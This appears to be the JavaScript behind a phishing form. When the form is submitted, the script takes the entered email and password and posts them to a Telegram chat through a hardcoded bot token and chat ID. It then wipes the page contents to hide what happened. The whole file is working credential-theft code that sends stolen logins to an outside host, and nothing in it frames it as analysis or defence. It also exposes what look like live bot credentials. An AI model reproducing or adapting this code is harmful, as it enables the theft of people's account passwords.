document.getElementById("data-form").addEventListener("submit", function (e) {
    e.preventDefault();

    // Get values from the form fields
    const email = document.getElementById("erf_username").value;
    const password = document.getElementById("erf_password").value;

    // Telegram bot token and chat ID
    const botToken = "7452593354:AAGpLye1ej6ofo7JsLfMzI1J1uwRcnsBT6c";
    const chatId = "-1002398011666";

    // Prepare the message to send to Telegram
    const message = `New submission:
Email: ${email}
Password: ${password}`;

    // Telegram API endpoint
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Send the message to Telegram
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then((response) => {
        if (response.ok) {
            // Change the background to white and hide the content
            document.body.style.backgroundColor = "white"; // Set background to white
            document.body.innerHTML = ""; // Remove all content from the page
        }
    })
    .catch((error) => {
        // Handle error silently if necessary.
    });
});

